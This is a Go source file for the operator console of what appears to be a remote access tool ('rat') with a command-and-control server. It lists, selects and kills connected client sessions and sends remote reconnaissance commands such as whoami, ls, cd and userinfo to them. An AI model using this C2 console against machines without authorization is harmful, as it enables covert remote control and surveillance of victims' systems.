package cli

import (
    "os"
    "fmt"
    "io"
    "strings"
    "strconv"

    "github.com/chzyer/readline"
    "github.com/olekukonko/tablewriter"
    "github.com/satori/go.uuid"

    "10.9.9.2/rat/pkg/c2err"
    "10.9.9.2/rat/pkg/server"
    "10.9.9.2/rat/pkg/env"
)

var terminal *readline.Instance
var completer *readline.PrefixCompleter
var terminalContext = "home"
var currentSession = ""

func Shell(s *server.Server) {
    completer = getCompleter("home", s)

    term, err := readline.NewEx(&readline.Config{
	Prompt: "\033[31mServer$\033[0m ",
	HistoryFile: "/tmp/history.txt",
	AutoComplete: completer,
	InterruptPrompt: "^C",
	EOFPrompt: "exit",
	HistorySearchFold: true,
    })
    c2err.CheckError(err)

    terminal = term

    defer func() {
	err := terminal.Close()
	c2err.CheckError(err)
    }()

    for {
	line, err := terminal.Readline()
	if err == readline.ErrInterrupt {
	    if len(line) == 0 {
		break
	    } else {
		continue
	    }
	} else if err == io.EOF {
	    exit()
	}

	line = strings.TrimSpace(line)
	cmd := strings.Fields(line)

	if len(cmd) > 0 {
	    switch terminalContext {
	    case "home":
		switch cmd[0] {
		    case "help":
			getHelp("home")
		    case "version":
			getVersion()
		    case "exit":
			exit()
		    case "sessions":
			if len(cmd) == 1 {
			    listSessions(s)
			} else if len(cmd) == 3 {
			    res, id := isValidSessionIdentifier(cmd[2], s)
			    if res == true {
				if cmd[1] == "-i" && cmd[2] == "all" {
				    fmt.Println("invalid command syntax")
				} else if cmd[1] == "-i" {
				    interactSession(id, s)
				} else if cmd[1] == "-k" && id == "all" {
				    for x, _ := range s.ClientConnections.UUIDInfoMap {
					killSession(x, s)
				    }
				} else if cmd[1] == "-k" {
				    killSession(id, s)
				} else {
				    fmt.Println("invalid command syntax")
				}
			    } else {
				fmt.Println("invalid session identifier")
			    }
			} else {
			    fmt.Println("invalid command syntax")
			}
		    case "interact":
			if len(cmd) <= 1 {
			    fmt.Println("interact requires exactly one argument")
			    break
			}
			res, id := isValidSessionIdentifier(cmd[1], s)
			if res == true {
			    interactSession(id, s)
			} else {
			    fmt.Println("invalid session identifier")
			}
		    case "kill":
			if len(cmd) <= 1 {
			    fmt.Println("kill requires exactly one argument")
			    break
			}
			if cmd[1] == "all" {
			    for x, _ := range s.ClientConnections.UUIDInfoMap {
				killSession(x, s)
			    }
			} else {
			    res, id := isValidSessionIdentifier(cmd[1], s)
			    if res == true {
				killSession(id, s)
			    } else {
				fmt.Println("invalid session identifier")
			    }
			}
		    default:
			fmt.Println("command not supported")
		}
	    case "session":
		switch cmd[0] {
		    case "help":
			getHelp("session")
		    case "close":
			killSession(currentSession, s)
			setMenuContext("home", s)
		    case "kill":
			killSession(currentSession, s)
			setMenuContext("home", s)
		    case "back":
			setMenuContext("home", s)
		    case "session-id":
			curId := getCurrentSessionId()
			fmt.Println(curId)
		    default:
			res := sendReceiveCommand(cmd, currentSession, s)
			fmt.Printf("%s\n", res)
		}
	    default:
		fmt.Println("context not yet supported")
	    }
	}
    }
}

func isValidSessionIdentifier(id string, s *server.Server) (bool, string) {
    x, err := strconv.Atoi(id)
    if err == nil {
	if id, ok := s.ClientConnections.CountUUIDMap[x]; ok {
	    return true, id
	} else {
	    return false, ""
	}
    } else if id == "all" {
	return true, id
    } else {
	_, err = uuid.FromString(id)
	if err != nil {
	    return false, ""
	} else {
	    if _, ok := s.ClientConnections.UUIDInfoMap[id]; ok {
		return true, id
	    } else {
		return false, ""
	    }
	}
    }
}

func getCompleter(ctx string, s *server.Server) *readline.PrefixCompleter {

    var home = readline.NewPrefixCompleter(
	readline.PcItem("help"),
	readline.PcItem("version"),
	readline.PcItem("exit"),
	readline.PcItem("sessions",
		readline.PcItem("-i",
			readline.PcItemDynamic(getSessionList(s)),
		),
		readline.PcItem("-k",
			readline.PcItemDynamic(getSessionList(s)),
			readline.PcItem("all"),
		),
	),
	readline.PcItem("interact",
		readline.PcItemDynamic(getSessionList(s)),
	),
	readline.PcItem("kill",
		readline.PcItemDynamic(getSessionList(s)),
		readline.PcItem("all"),
	),
    )

    var session = readline.NewPrefixCompleter(
	readline.PcItem("help"),
	readline.PcItem("back"),
	readline.PcItem("close"),
	readline.PcItem("kill"),
	readline.PcItem("session-id"),
	readline.PcItem("cwd"),
	readline.PcItem("pwd"),
	readline.PcItem("hostname"),
	readline.PcItem("cd"),
	readline.PcItem("whoami"),
	readline.PcItem("userinfo"),
	readline.PcItem("getuid"),
	readline.PcItem("getgid"),
	readline.PcItem("homedir"),
	readline.PcItem("ls"),
    )

    switch ctx {
    case "home":
	return home
    case "session":
	return session
    default:
	return home
    }
}

func getSessionList(s *server.Server) func(string) []string {
    return func(line string) []string {
	data := make([]string, 0)
	for k, _ := range s.ClientConnections.UUIDInfoMap {
	    data = append(data, k)
	}
	return data
    }
}

func exit() {
    fmt.Println("server shutting down..")
    os.Exit(0)
}

func getHelp(ctx string) {
    
    table := tablewriter.NewWriter(os.Stdout)
    table.SetAlignment(tablewriter.ALIGN_LEFT)
    table.SetBorder(false)
    table.SetCaption(true, "Help")
    table.SetHeader([]string{"Command", "Description", "Options", "Type"})

    var data [][]string

    switch ctx {
    case "home":
	data = [][]string{
	    {"help", "Show this output", "", "local"},
	    {"version", "Print server version", "", "local"},
	    {"exit", "Shut down the server", "", "local"},
	    {"sessions", "List, [-i]nteract, or [-k]ill connected sessions", "[-i <SESSION>], [-k <SESSION>]", "local"},
	    {"interact", "Interact with a connected session", "<SESSION>", "local"},
	    {"kill", "Kill a connected session", "<SESSION>", "local"},
	}
    case "session":
	data = [][]string{
	    {"help", "Show this output", "", "local"},
	    {"back", "Return to the main menu", "", "local"},
	    {"close", "Kill the current session", "", "local"},
	    {"kill", "Kill the current session", "", "local"},
	    {"session-id", "Print the current session id", "", "local"},
	    {"cwd", "List the current working directory", "", "remote"},
	    {"pwd", "List the current working directory", "", "remote"},
	    {"hostname", "Print the hostname", "", "remote"},
	    {"cd", "Change current working directory", "<DIRECTORY>", "remote"},
	    {"whoami", "Print the current user name", "", "remote"},
	    {"userinfo", "Print info about the current user", "", "remote"},
	    {"getuid", "Print the uid of the current user", "", "remote"},
	    {"getgid", "Print the gid of the current user", "", "remote"},
	    {"homedir", "Print the home directory of the current user, if exists", "", "remote"},
	    {"ls", "List information about a file or directory", "[FILEPATH]", "remote"},
	}
    }

    table.SetAutoMergeCellsByColumnIndex([]int{3})
    table.SetAutoWrapText(false)
    table.AppendBulk(data)
    fmt.Println()
    table.Render()
    fmt.Println()
}

func getVersion() {
    fmt.Println(env.Version)
}

func listSessions(s *server.Server) {
    table := tablewriter.NewWriter(os.Stdout)
    table.SetAlignment(tablewriter.ALIGN_LEFT)
    table.SetBorder(false)
    table.SetCaption(true, "Sessions")
    table.SetHeader([]string{"Session ID", "Client UUID", "Hostname", "IP Address"})

    var data [][]string

    for k, v := range s.ClientConnections.CountUUIDMap {
	data = append(data, []string{strconv.Itoa(k), v, s.ClientConnections.UUIDInfoMap[v].Hostname, ""})
    }
    
    table.AppendBulk(data)
    fmt.Println()
    table.Render()
    fmt.Println()
}

func interactSession(id string, s *server.Server) {
    fmt.Printf("interacting with client: %s\n", id)
    currentSession = id
    setMenuContext("session", s)
    terminal.SetPrompt("\033[31mServer[\033[32m" + s.ClientConnections.UUIDInfoMap[id].Hostname + "\033[31m]\033[33m\033[31m$\033[0m ")
}

func killSession(id string, s *server.Server) {
    fmt.Printf("killing session with uuid: %s\n", id)
    s.ClientConnections.UUIDInfoMap[id].Connection.Close()
    delete(s.ClientConnections.UUIDInfoMap, id)
    for k, _ := range s.ClientConnections.CountUUIDMap {
	if s.ClientConnections.CountUUIDMap[k] == id {
	    delete(s.ClientConnections.CountUUIDMap, k)
	    break
	}
    }
    s.ClientConnections.ConnectionCountCur -= 1
}

func setMenuContext(ctx string, s *server.Server) {
    terminal.Config.AutoComplete = getCompleter(ctx, s)
    terminalContext = ctx
    if ctx == "home" {
	terminal.SetPrompt("\033[31mServer$\033[0m ")
	currentSession = ""
    }
}

func getCurrentSessionId() string {
    return currentSession
}

func sendReceiveCommand(cmd []string, id string, s *server.Server) string {
    //Check if session is still valid, in case of lost connection to client
    if _, ok := s.ClientConnections.UUIDInfoMap[id]; !ok {
	fmt.Printf("session closed by remote host")
	setMenuContext("home", s)
	return ""
    }
    err := s.ClientConnections.UUIDInfoMap[id].Pipes.Enc.Encode(cmd)
    c2err.CheckError(err)
    var res string
    err = s.ClientConnections.UUIDInfoMap[id].Pipes.Dec.Decode(&res)
    c2err.CheckError(err)
    return res
}
